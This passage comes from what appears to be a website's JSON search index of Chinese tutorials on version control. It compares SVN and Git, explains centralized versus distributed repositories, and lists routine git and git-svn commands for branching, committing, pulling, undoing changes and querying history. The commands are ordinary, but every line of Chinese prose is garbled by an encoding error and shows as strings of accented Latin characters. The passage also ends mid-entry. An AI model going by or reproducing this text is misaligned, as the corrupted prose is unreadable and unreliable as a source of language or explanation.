ï¼Œåé¢æœ‰ä¿®æ”¹äº†ä¸€äº›ï¼Œçªç„¶IDEå´©æºƒï¼Œä½†æ˜¯å‘ç°è¿˜æ˜¯ä»¥å‰çš„ä»£ç æ›´å¥½ï¼Œ è¿™ä¸ªæ—¶å€™æ— æ³•å›å»ï¼Œè¿™ä¸ªæ—¶å€™æ²¡æœ‰åæ‚”è¯åƒï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç‰ˆæœ¬å¤‡ä»½ï¼Œä½†æ˜¯å³èŠ±è´¹ç©ºé—´å’ŒèŠ±è´¹æ—¶é—´ï¼‰ã€‚ ç”±äºä¸Šé¢çš„ç‰ˆæœ¬å¤‡ä»½é€ æˆç‰ˆæœ¬ä¼—å¤šï¼Œéš¾äºæ‰¾åˆ°æ­£ç¡®çš„ç‰ˆæœ¬ï¼ˆSVNæœ‰ä¸“é—¨çš„æ—¥å¿—è®°å½•äº†æ–‡ä»¶çš„æ¯ä¸€æ¬¡ä¿®æ”¹ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹æ—¥å¿—å›åˆ°ä»»ä½•ä¸€ä¸ªè‡ªå·±æƒ³è¦çš„ç‰ˆæœ¬ï¼‰ã€‚ ä»£ç å†²çªçš„é—®é¢˜ï¼Œä¸»è¦æ˜¯å¤šäººæ“ä½œåŒä¸€ä¸ªæ–‡ä»¶ï¼ˆå›¢é˜Ÿå¼€å‘å¾ˆå¸¸è§ï¼‰ã€‚ å¯ä»¥æŸ¥çœ‹æ¯ä¸ªäººå…·ä½“çš„æ“ä½œï¼Œä¾¿äºå‡ºç°é—®é¢˜ååŠæ—¶æ’æŸ¥ï¼ˆç”±äºæŸä¸ªå‘˜å·¥ä¸ªäººå¤±è¯¯é€ æˆå¾ˆå¤§çš„bugï¼Œå¯ä»¥æ–¹ä¾¿çš„è¿½ç©¶è´£ä»»ï¼‰ã€‚ å¸¸è§çš„ç‰ˆæœ¬æ§åˆ¶å™¨åˆ†ç±» CVSï¼ˆ90å¹´ä»£å¼€å‘ï¼Œç‰ˆæœ¬æ§åˆ¶å™¨çš„é¼»ç¥–ï¼‰ SVNï¼ˆCVSçš„æ¥ç­äººï¼‰ VSSï¼ˆå¾®è½¯äº§å“ï¼‰ GITï¼ˆæçº³æ–¯å¼€å‘ï¼‰ SVN SVNï¼šä»£ç æ§åˆ¶å™¨ï¼ˆç‰ˆæœ¬æ§åˆ¶å™¨ï¼‰ï¼Œä¸»è¦æ˜¯ä¸ºäº†å¤šäººååŒå¼€å‘é¡¹ç›®ï¼Œ ç®¡ç†ä»£ç ã€‚ä¹Ÿå¯ä»¥ç®¡ç†ä¸ªäººä»£ç ã€‚ä¹Ÿå«ç¨‹åºç•Œçš„\"åæ‚”è¯\"ã€‚ SVNï¼ˆæ˜¯subversionçš„ç®€ç§°ï¼‰æ˜¯è¿‘å¹´æ¥ä¸€æ¬¾åŸºäºC/Sæ¶æ„çš„ï¼Œéå¸¸ä¼˜ç§€çš„ç‰ˆæœ¬æ§åˆ¶å™¨ï¼ˆå¯ä»¥ç®€å•çš„ç†è§£ä¸ºç®¡ç†ä»£ç çš„å·¥å…·ï¼Œåœ¨å¤šäººååŒå¼€å‘çš„æ—¶å€™ï¼Œå°¤å…¶é‡è¦ï¼‰ï¼Œ ä¸ä¼ ç»Ÿçš„CVSï¼ˆ90å¹´ä»£å·¦å³ï¼Œä¸€ä¸ªéå¸¸ä¼˜ç§€çš„ä»£ç ç®¡ç†å™¨ï¼Œæ˜¯ä»£ç ç®¡ç†å™¨çš„é¼»ç¥–ï¼‰ç®¡ç†å·¥å…·ç±»ä¼¼ã€‚ SVNå¯ä»¥éšç€æ—¶é—´çš„æ¨ç§»æ¥ç®¡ç†å„ç§æ•°æ®ï¼Œè¿™äº›æ•°æ®è¢«æ”¾ç½®åœ¨ä¸€ä¸ªSVNç®¡ç†çš„ä¸­å¤®ä»“åº“ï¼ˆæ‰€æœ‰çš„ä»£ç çš„é›†åˆï¼‰é‡Œé¢ã€‚ åŒæ—¶SVNä¼šå¤‡ä»½å¹¶è®°å½•æ¯ä¸ªæ–‡ä»¶æ¯ä¸€æ¬¡çš„ä¿®æ”¹æ›´æ–°å˜åŠ¨ã€‚ è¿™æ ·å°±å¼€å‘è€…å°±å¯ä»¥å›å½’åˆ°ä»»ä½•ä¸€ä¸ªæ—¶é—´ç‚¹çš„æŸä¸€ä¸ªæ—§çš„ç‰ˆæœ¬ï¼ˆå¯¹äºSVNï¼Œæ²¡ä¿®æ”¹ä¸€æ¬¡æ–‡ä»¶ï¼ŒSVNå°±ä¼šåˆ›å»ºä¸€ä¸ªå«åšç‰ˆæœ¬çš„æ¦‚å¿µï¼Œæ˜¯ä»0 å¼€å§‹è‡ªå¢çš„åºåˆ—ï¼‰ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šæ–‡ä»¶çš„æ›´æ–°å†å²è®°å½•ï¼ˆindex.phpï¼‰ã€‚ SVNåˆå«åšé›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶å™¨ã€‚ä¸¥é‡çš„ä¾èµ–æœåŠ¡å™¨ç«¯ï¼Œå½“æœåŠ¡å™¨ç«¯æ— æ³•ä½¿ç”¨çš„æ—¶å€™ï¼Œç‰ˆæœ¬æ§åˆ¶ä¹Ÿå°±æ— æ³•å†ä½¿ç”¨äº†ã€‚ GIT Gitæ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆæ²¡æœ‰ä¹‹ä¸€ï¼‰ã€‚ å½“è¿™ä¸ªç³»ç»Ÿçš„ä»»ä½•ä¸€ä¸ªå®¢æˆ·ç«¯å‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œéƒ½å¯ä»¥ä»å¦å¤–çš„å®¢æˆ·ç«¯ï¼ˆå³ä½¿æœåŠ¡å™¨æŒ‚äº†ï¼‰è·å–æ‰€æœ‰çš„ä»£ç ã€‚ SVNä¸GITçš„åŒºåˆ« GITæ˜¯åˆ†å¸ƒå¼çš„ï¼Œè€ŒSVNæ˜¯é›†ä¸­å¼çš„ GITæŠŠå†…å®¹æŒ‰å…ƒæ•°æ®æ–¹å¼å­˜å‚¨ï¼Œè€ŒSVNæ˜¯æŒ‰æ–‡ä»¶ï¼šå› ä¸ºgitç›®å½•æ˜¯å¤„äºä¸ªäººæœºå™¨ä¸Šçš„ä¸€ä¸ªå…‹éš†ç‰ˆçš„ç‰ˆæœ¬åº“ï¼Œå®ƒæ‹¥æœ‰ä¸­å¿ƒç‰ˆæœ¬åº“ä¸Šæ‰€æœ‰çš„ä¸œè¥¿ï¼Œä¾‹å¦‚æ ‡ç­¾ï¼Œåˆ†æ”¯ï¼Œç‰ˆæœ¬è®°å½•ç­‰ã€‚ GITåˆ†æ”¯å’ŒSVNçš„åˆ†æ”¯ä¸åŒï¼šsvnä¼šå‘ç”Ÿåˆ†æ”¯é—æ¼çš„æƒ…å†µï¼Œè€Œgitå¯ä»¥åŒä¸€ä¸ªå·¥ä½œç›®å½•ä¸‹å¿«é€Ÿçš„åœ¨å‡ ä¸ªåˆ†æ”¯é—´åˆ‡æ¢ï¼Œå¾ˆå®¹æ˜“å‘ç°æœªè¢«åˆå¹¶çš„åˆ†æ”¯ï¼Œç®€å•è€Œå¿«æ·çš„åˆå¹¶è¿™äº›æ–‡ä»¶ã€‚ GITæ²¡æœ‰ä¸€ä¸ªå…¨å±€çš„ç‰ˆæœ¬å·ï¼Œè€ŒSVNæœ‰ GITçš„å†…å®¹å®Œæ•´æ€§è¦ä¼˜äºSVNï¼šGITçš„å†…å®¹å­˜å‚¨ä½¿ç”¨çš„æ˜¯SHA-1å“ˆå¸Œç®—æ³•ã€‚è¿™èƒ½ç¡®ä¿ä»£ç å†…å®¹çš„å®Œæ•´æ€§ï¼Œç¡®ä¿åœ¨é‡åˆ°ç£ç›˜æ•…éšœå’Œç½‘ç»œé—®é¢˜æ—¶é™ä½å¯¹ç‰ˆæœ¬åº“çš„ç ´åã€‚ é›†ä¸­å¼å’Œåˆ†å¸ƒå¼çš„åŒºåˆ« é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼šç‰ˆæœ¬åº“æ˜¯é›†ä¸­å­˜æ”¾åœ¨ä¸­å¤®æœåŠ¡å™¨çš„ï¼Œè€Œå¹²æ´»çš„æ—¶å€™ï¼Œç”¨çš„éƒ½æ˜¯è‡ªå·±çš„ç”µè„‘ï¼Œ æ‰€ä»¥è¦å…ˆä»ä¸­å¤®æœåŠ¡å™¨å–å¾—æœ€æ–°çš„ç‰ˆæœ¬ï¼Œç„¶åå¼€å§‹å¹²æ´»ï¼Œå¹²å®Œæ´»äº†ï¼Œ å†æŠŠè‡ªå·±çš„æ´»æ¨é€ç»™ä¸­å¤®æœåŠ¡å™¨ã€‚é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæœ€å¤§çš„æ¯›ç—…å°±æ˜¯å¿…é¡»è”ç½‘æ‰èƒ½å·¥ä½œã€‚ åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼šåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ ¹æœ¬æ²¡æœ‰\"ä¸­å¤®æœåŠ¡å™¨\"ï¼Œæ¯ä¸ªäººçš„ç”µè„‘ä¸Šéƒ½æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç‰ˆæœ¬åº“ï¼Œ è¿™æ ·ï¼Œä½ å·¥ä½œçš„æ—¶å€™ï¼Œå°±ä¸éœ€è¦è”ç½‘äº†ï¼Œå› ä¸ºç‰ˆæœ¬åº“å°±åœ¨ä½ è‡ªå·±çš„ç”µè„‘ä¸Šã€‚ æ¯”æ–¹è¯´ä½ åœ¨è‡ªå·±ç”µè„‘ä¸Šæ”¹äº†æ–‡ä»¶Aï¼Œä½ çš„åŒäº‹ä¹Ÿåœ¨ä»–çš„ç”µè„‘ä¸Šæ”¹äº†æ–‡ä»¶Aï¼Œ è¿™æ—¶ï¼Œä½ ä»¬ä¿©ä¹‹é—´åªéœ€æŠŠå„è‡ªçš„ä¿®æ”¹æ¨é€ç»™å¯¹æ–¹ï¼Œå°±å¯ä»¥äº’ç›¸çœ‹åˆ°å¯¹æ–¹çš„ä¿®æ”¹äº†ã€‚ ä¸ºäº†æ–¹ä¾¿\"äº¤æ¢\"å¤§å®¶çš„ä¿®æ”¹ï¼Œåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿé€šå¸¸ä¹Ÿæœ‰ä¸€å°å……å½“\"ä¸­å¤®æœåŠ¡å™¨\"çš„ç”µè„‘ï¼Œä½†æ²¡æœ‰å®ƒå¤§å®¶ä¹Ÿä¸€æ ·å¹²æ´»ï¼Œåªæ˜¯äº¤æ¢ä¿®æ”¹ä¸æ–¹ä¾¿è€Œå·²ã€‚ åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„å®‰å…¨æ€§è¦é«˜å¾ˆå¤šï¼Œå› ä¸ºæ¯ä¸ªäººç”µè„‘é‡Œéƒ½æœ‰å®Œæ•´çš„ç‰ˆæœ¬åº“ï¼Œ æŸä¸€ä¸ªäººçš„ç”µè„‘åæ‰äº†ä¸è¦ç´§ï¼Œéšä¾¿ä»å…¶ä»–äººé‚£é‡Œå¤åˆ¶ä¸€ä¸ªå°±å¯ä»¥äº†ã€‚ è€Œé›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ä¸­å¤®æœåŠ¡å™¨è¦æ˜¯å‡ºäº†é—®é¢˜ï¼Œæ‰€æœ‰äººéƒ½æ²¡æ³•å¹²æ´»äº†ã€‚ å‚è€ƒ: https://blog.csdn.net/qq_40143330/article/details/79816024 å¸¸ç”¨å‘½ä»¤ Git vs SVN Git å’Œ SVN å­°ä¼˜å­°å¥½ï¼Œæ¯ä¸ªäººæœ‰ä¸åŒçš„ä½“éªŒã€‚ Gitæ˜¯åˆ†å¸ƒå¼çš„ï¼ŒSVNæ˜¯é›†ä¸­å¼çš„ è¿™æ˜¯ Git å’Œ SVN æœ€å¤§çš„åŒºåˆ«ã€‚è‹¥èƒ½æŒæ¡è¿™ä¸ªæ¦‚å¿µï¼Œä¸¤è€…åŒºåˆ«åŸºæœ¬ææ‡‚å¤§åŠã€‚ å› ä¸º Git æ˜¯åˆ†å¸ƒå¼çš„ï¼Œæ‰€ä»¥ Git æ”¯æŒç¦»çº¿å·¥ä½œï¼Œåœ¨æœ¬åœ°å¯ä»¥è¿›è¡Œå¾ˆå¤šæ“ä½œï¼Œ åŒ…æ‹¬æ¥ä¸‹æ¥å°†è¦é‡ç£…æ¨å‡ºçš„åˆ†æ”¯åŠŸèƒ½ã€‚è€Œ SVN å¿…é¡»è”ç½‘æ‰èƒ½æ­£å¸¸å·¥ä½œã€‚ Gitå¤æ‚æ¦‚å¿µå¤šï¼ŒSVNç®€å•æ˜“ä¸Šæ‰‹ æ‰€æœ‰åŒæ—¶æŒæ¡ Git å’Œ SVN çš„å¼€å‘è€…éƒ½å¿…é¡»æ‰¿è®¤ï¼ŒGit çš„å‘½ä»¤å®åœ¨å¤ªå¤šäº†ï¼Œ æ—¥å¸¸å·¥ä½œéœ€è¦æŒæ¡ add , commit , status , fetch , push , rebase`ç­‰ï¼Œ è‹¥è¦ç†Ÿç»ƒæŒæ¡ï¼Œè¿˜å¿…é¡»æŒæ¡ `rebase å’Œ merge çš„åŒºåˆ«ï¼Œ fetch å’Œ pull çš„åŒºåˆ«ç­‰ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ cherry-pick , submodule , stash ç­‰åŠŸèƒ½ï¼Œä»…æ˜¯è¿™äº›åè¯å¬ç€éƒ½å¾ˆç»•ã€‚ åœ¨æ˜“ç”¨æ€§è¿™æ–¹é¢ï¼ŒSVN ä¼šå¥½å¾—å¤šï¼Œç®€å•æ˜“ä¸Šæ‰‹ï¼Œå¯¹æ–°æ‰‹å¾ˆå‹å¥½ã€‚ ä½†æ˜¯ä»å¦å¤–ä¸€æ–¹é¢çœ‹ï¼ŒGit å‘½ä»¤å¤šæ„å‘³ç€åŠŸèƒ½å¤šï¼Œè‹¥æˆ‘ä»¬èƒ½æŒæ¡å¤§éƒ¨åˆ† Git çš„åŠŸèƒ½ï¼Œ ä½“ä¼šåˆ°å…¶ä¸­çš„å¥¥å¦™ï¼Œä¼šå‘ç°å†ä¹Ÿå›ä¸å» SVN çš„æ—¶ä»£äº†ã€‚ Gitåˆ†æ”¯å»‰ä»·ï¼ŒSVNåˆ†æ”¯æ˜‚è´µ åœ¨ç‰ˆæœ¬ç®¡ç†é‡Œï¼Œåˆ†æ”¯æ˜¯å¾ˆå¸¸ä½¿ç”¨çš„åŠŸèƒ½ã€‚ åœ¨å‘å¸ƒç‰ˆæœ¬å‰ï¼Œéœ€è¦å‘å¸ƒåˆ†æ”¯ï¼Œè¿›è¡Œå¤§éœ€æ±‚å¼€å‘ï¼Œéœ€è¦ feature åˆ†æ”¯ï¼Œ å¤§å›¢é˜Ÿè¿˜ä¼šæœ‰å¼€å‘åˆ†æ”¯ï¼Œç¨³å®šåˆ†æ”¯ç­‰ã€‚åœ¨å¤§å›¢é˜Ÿå¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸å­˜åœ¨åˆ›å»ºåˆ†æ”¯ï¼Œåˆ‡æ¢åˆ†æ”¯çš„éœ€æ±‚ã€‚ Git åˆ†æ”¯æ˜¯æŒ‡é’ˆæŒ‡å‘æŸæ¬¡æäº¤ï¼Œè€Œ SVN åˆ†æ”¯æ˜¯æ‹·è´çš„ç›®å½•ã€‚è¿™ä¸ªç‰¹æ€§ä½¿ Git çš„åˆ†æ”¯åˆ‡æ¢éå¸¸è¿…é€Ÿï¼Œä¸”åˆ›å»ºæˆæœ¬éå¸¸ä½ã€‚ è€Œä¸” Git æœ‰æœ¬åœ°åˆ†æ”¯ï¼ŒSVN æ— æœ¬åœ°åˆ†æ”¯ã€‚ åœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°æœ‰äº›ä»£ç æ²¡å†™å®Œï¼Œä½†æ˜¯éœ€ç´§æ€¥å¤„ç†å…¶ä»–é—®é¢˜ï¼Œ è‹¥æˆ‘ä»¬ä½¿ç”¨ Gitï¼Œä¾¿å¯ä»¥åˆ›å»ºæœ¬åœ°åˆ†æ”¯å­˜å‚¨æ²¡å†™å®Œçš„ä»£ç ï¼Œå¾…é—®é¢˜å¤„ç†å®Œåï¼Œå†å›åˆ°æœ¬åœ°åˆ†æ”¯ç»§ç»­å®Œæˆä»£ç ã€‚ Git æ ¸å¿ƒæ¦‚å¿µ Git æœ€æ ¸å¿ƒçš„ä¸€ä¸ªæ¦‚å¿µå°±æ˜¯å·¥ä½œæµã€‚ å·¥ä½œåŒº(Workspace)æ˜¯ç”µè„‘ä¸­å®é™…çš„ç›®å½•ã€‚ æš‚å­˜åŒº(Index)ç±»ä¼¼äºç¼“å­˜åŒºåŸŸï¼Œä¸´æ—¶ä¿å­˜ä½ çš„æ”¹åŠ¨ã€‚ ä»“åº“åŒº(Repository)ï¼Œåˆ†ä¸ºæœ¬åœ°ä»“åº“å’Œè¿œç¨‹ä»“åº“ã€‚ ä» SVN åˆ‡æ¢åˆ° Gitï¼Œæœ€éš¾ç†è§£å¹¶ä¸”æœ€ä¸èƒ½ç†è§£çš„æ˜¯æš‚å­˜åŒºå’Œæœ¬åœ°ä»“åº“ã€‚ç†Ÿç»ƒä½¿ç”¨ Git åï¼Œä¼šå‘ç°è¿™ç®€ç›´æ˜¯ç¥è®¾è®¡ï¼Œç”±äºè¿™ä¸¤è€…çš„å­˜åœ¨ï¼Œä½¿è®¸å¤šå·¥ä½œå˜å¾—æ˜“ç®¡ç†ã€‚ é€šå¸¸æäº¤ä»£ç åˆ†ä¸ºå‡ æ­¥ï¼š git add ä»å·¥ä½œåŒºæäº¤åˆ°æš‚å­˜åŒº git commit ä»æš‚å­˜åŒºæäº¤åˆ°æœ¬åœ°ä»“åº“ git push æˆ– git svn dcommit ä»æœ¬åœ°ä»“åº“æäº¤åˆ°è¿œç¨‹ä»“åº“ Git-SVNå¸¸ç”¨å‘½ä»¤ æœ¬èŠ‚å‘½ä»¤é’ˆå¯¹ä½¿ç”¨ Git-SVN çš„å¼€å‘è€…ï¼Œè¯·åŠ¡å¿…æŒæ¡ã€‚ è‹¥æœåŠ¡å™¨ä½¿ç”¨çš„ SVNï¼Œä½†æ˜¯æœ¬åœ°æƒ³è¦ä½“éªŒ Git çš„æœ¬åœ°åˆ†æ”¯ï¼Œç¦»çº¿æ“ä½œç­‰åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨ Git-SVN åŠŸèƒ½ã€‚ å¸¸ç”¨æ“ä½œ: # ä¸‹è½½ä¸€ä¸ª SVN é¡¹ç›®å’Œå®ƒçš„æ•´ä¸ªä»£ç å†å²ï¼Œå¹¶åˆå§‹åŒ–ä¸º Git ä»£ç åº“ $ git svn clone -s [repository] # æŸ¥çœ‹å½“å‰ç‰ˆæœ¬åº“æƒ…å†µ $ git svn info # å–å›è¿œç¨‹ä»“åº“æ‰€æœ‰åˆ†æ”¯çš„å˜åŒ– $ git svn fetch # å–å›è¿œç¨‹ä»“åº“å½“å‰åˆ†æ”¯çš„å˜åŒ–ï¼Œå¹¶ä¸æœ¬åœ°åˆ†æ”¯å˜åŸºåˆå¹¶ $ git svn rebase # ä¸Šä¼ å½“å‰åˆ†æ”¯çš„æœ¬åœ°ä»“åº“åˆ°è¿œç¨‹ä»“åº“ $ git svn dcommit # æ‹‰å–æ–°åˆ†æ”¯ï¼Œå¹¶æäº¤åˆ°è¿œç¨‹ä»“åº“ $ svn copy [remote_branch] [new_remote_branch] -m [message] # åˆ›å»ºè¿œç¨‹åˆ†æ”¯å¯¹åº”çš„æœ¬åœ°åˆ†æ”¯ $ git checkout -b [local_branch] [remote_branch] åˆå§‹åŒ– ä»æœ¬èŠ‚å¼€å§‹ï¼Œé™¤ç‰¹æ®Šè¯´æ˜ï¼Œä»¥ä¸‹å‘½ä»¤å‡é€‚ç”¨äº Git ä¸ Git-SVN : # åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªGitä»£ç åº“ $ git init # ä¸‹è½½ä¸€ä¸ªé¡¹ç›®å’Œå®ƒçš„æ•´ä¸ªä»£ç å†å² [Git only] $ git clone [url] é…ç½® åˆ—ä¸¾æ‰€æœ‰é…ç½®: $ git config -l ä¸ºå‘½ä»¤é…ç½®åˆ«å: $ git config --global alias.co checkout $ git config --global alias.ci commit $ git config --global alias.st status $ git config --global alias.br branch è®¾ç½®æäº¤ä»£ç æ—¶çš„ç”¨æˆ·ä¿¡æ¯: $ git config [--global] user.name \"[name]\" $ git config [--global] user.email \"[email address]\" Git ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ä½äº ~/.gitconfig Git å•ä¸ªä»“åº“çš„é…ç½®æ–‡ä»¶ä½äº ~/$PROJECT_PATH/.git/config å¢åˆ æ–‡ä»¶ æ·»åŠ å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº: $ git add . æ·»åŠ æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒº: $ git add <file1> <file2> ... æ·»åŠ æŒ‡å®šç›®å½•åˆ°æš‚å­˜åŒºï¼ŒåŒ…æ‹¬å…¶å­ç›®å½•: $ git add <dir> åˆ é™¤å·¥ä½œåŒºæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™æ¬¡åˆ é™¤æ”¾å…¥æš‚å­˜åŒº: $ git rm [file1] [file2] ... åœæ­¢è¿½è¸ªæŒ‡å®šæ–‡ä»¶ï¼Œä½†è¯¥æ–‡ä»¶ä¼šä¿ç•™åœ¨å·¥ä½œåŒº: $ git rm --cached [file] æ”¹åæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™ä¸ªæ”¹åæ”¾å…¥æš‚å­˜åŒº: $ git mv [file-original] [file-renamed] æŠŠæ–‡ä»¶å file1 æ·»åŠ åˆ° .gitignore æ–‡ä»¶é‡Œï¼ŒGit ä¼šåœæ­¢è·Ÿè¸ª file1 çš„çŠ¶æ€ã€‚ åˆ†æ”¯ åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯: $ git branch åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯: $ git branch -a æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä½†ä¾ç„¶åœç•™åœ¨å½“å‰åˆ†æ”¯: $ git branch [branch-name] æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯: $ git checkout -b [new_branch] [remote-branch] åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ï¼Œå¹¶æ›´æ–°å·¥ä½œåŒº: $ git checkout [branch-name] åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯: $ git merge [branch] é€‰æ‹©ä¸€ä¸ª commitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯: $ git cherry-pick [commit] åˆ é™¤æœ¬åœ°åˆ†æ”¯ï¼Œ-D å‚æ•°å¼ºåˆ¶åˆ é™¤åˆ†æ”¯: $ git branch -d [branch-name] åˆ é™¤è¿œç¨‹åˆ†æ”¯: $ git push [remote] :[remote-branch] æäº¤ æäº¤æš‚å­˜åŒºåˆ°ä»“åº“åŒº: $ git commit -m [message] æäº¤å·¥ä½œåŒºä¸æš‚å­˜åŒºçš„å˜åŒ–ç›´æ¥åˆ°ä»“åº“åŒº: $ git commit -a æäº¤æ—¶æ˜¾ç¤ºæ‰€æœ‰ diff ä¿¡æ¯: $ git commit -v æäº¤æš‚å­˜åŒºä¿®æ”¹åˆ°ä»“åº“åŒºï¼Œåˆå¹¶åˆ°ä¸Šæ¬¡ä¿®æ”¹ï¼Œå¹¶ä¿®æ”¹ä¸Šæ¬¡çš„æäº¤ä¿¡æ¯: $ git commit --amend -m [message] ä¸Šä¼ æœ¬åœ°æŒ‡å®šåˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“: $ git push [remote] [remote-branch] æ‹‰å– ä¸‹è½½è¿œç¨‹ä»“åº“çš„æ‰€æœ‰å˜åŠ¨ (Git only): $ git fetch [remote] æ˜¾ç¤ºæ‰€æœ‰è¿œç¨‹ä»“åº“ (Git only): $ git remote -v æ˜¾ç¤ºæŸä¸ªè¿œç¨‹ä»“åº“çš„ä¿¡æ¯ (Git only): $ git remote show [remote] å¢åŠ ä¸€ä¸ªæ–°çš„è¿œç¨‹ä»“åº“ï¼Œå¹¶å‘½å (Git only): $ git remote add [remote-name] [url] å–å›è¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶ä¸æœ¬åœ°åˆ†æ”¯åˆå¹¶ï¼Œ(Git only), è‹¥ä½¿ç”¨ Git-SVNï¼Œè¯·æŸ¥çœ‹ç¬¬ä¸‰èŠ‚: $ git pull [remote] [branch] å–å›è¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶ä¸æœ¬åœ°åˆ†æ”¯å˜åŸºåˆå¹¶ï¼Œ(Git only), è‹¥ä½¿ç”¨ Git-SVNï¼Œè¯·æŸ¥çœ‹ç¬¬ä¸‰èŠ‚: $ git pull --rebase [remote] [branch] æ’¤é”€ æ¢å¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°å·¥ä½œåŒº: $ git checkout [file] æ¢å¤æš‚å­˜åŒºå½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åˆ°å·¥ä½œåŒº: $ git checkout . æ¢å¤å·¥ä½œåŒºåˆ°æŒ‡å®š commit: $ git checkout [commit] é‡ç½®æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶ï¼Œä¸ä¸Šä¸€æ¬¡ commit ä¿æŒä¸€è‡´ï¼Œä½†å·¥ä½œåŒºä¸å˜: $ git reset [file] é‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¸ä¸Šä¸€æ¬¡ commit ä¿æŒä¸€è‡´: $ git reset --hard é‡ç½®å½“å‰åˆ†æ”¯çš„æŒ‡é’ˆä¸ºæŒ‡å®š commitï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºï¼Œä½†å·¥ä½œåŒºä¸å˜: $ git reset [commit] é‡ç½®å½“å‰åˆ†æ”¯çš„HEADä¸ºæŒ‡å®š commitï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºå’Œå·¥ä½œåŒºï¼Œä¸æŒ‡å®š commit ä¸€è‡´: $ git reset --hard [commit] æ–°å»ºä¸€ä¸ª commitï¼Œç”¨äºæ’¤é”€æŒ‡å®š commit: $ git revert [commit] å°†æœªæäº¤çš„å˜åŒ–æ”¾åœ¨å‚¨è—åŒº: $ git stash å°†å‚¨è—åŒºçš„å†…å®¹æ¢å¤åˆ°å½“å‰å·¥ä½œåŒº: $ git stash pop æŸ¥è¯¢ æŸ¥çœ‹å·¥ä½œåŒºæ–‡ä»¶ä¿®æ”¹çŠ¶æ€: $ git status æŸ¥çœ‹å·¥ä½œåŒºæ–‡ä»¶ä¿®æ”¹å…·ä½“å†…å®¹: $ git diff [file] æŸ¥çœ‹æš‚å­˜åŒºæ–‡ä»¶ä¿®æ”¹å†…å®¹: $ git diff --cached [file] æŸ¥çœ‹ç‰ˆæœ¬åº“ä¿®æ”¹è®°å½•: $ git log æŸ¥çœ‹æŸäººæäº¤è®°å½•: $ git log --author=someone æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„å†å²å…·ä½“ä¿®æ”¹å†…å®¹: $ git log -p [file] æŸ¥çœ‹æŸæ¬¡æäº¤å…·ä½“ä¿®æ”¹å†…å®¹: $ git show [commit]","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-The-difference-between-SVN-and-git.html","loc":"/yq-doc-source-docs-version-control-The-difference-between-SVN-and-git.html"},{"title":"æŒ‡ä»¤","text":"blame branch checkout commit config diff fetch log merge pull push rebase reflog release reset restore revert show stash status submodule tag update-index","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-index.html","loc":"/yq-doc-source-docs-version-control-git-Command-index.html"},{"title":"git å‘½ä»¤","text":"./command å¦‚ä½•è¡¨ç¤ºç‰ˆæœ¬å·è”ç³» å¯ä»¥ä½¿ç”¨ ç‰ˆæœ¬å·~num è¡¨ç¤º. æ¯”å¦‚æœ‰ä¸€ä¸ªhashçš„ç‰ˆæœ¬å·: 1109duw1 , å‰ä¸€ä¸ªç‰ˆæœ¬å¯ä»¥è¡¨ç¤ºä¸º: 1109duw1~1 , å‰ç¬¬äºŒä¸ªç‰ˆæœ¬: 1109duw1~2","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-git-command.html","loc":"/yq-doc-source-docs-version-control-git-git-command.html"},{"title":"Git","text":"gitå‘½ä»¤ gitå·¥ä½œåŸç† ä¸€äº›é—®é¢˜,ç”¨æ³• æ¢è¡Œç¬¦é—®é¢˜ 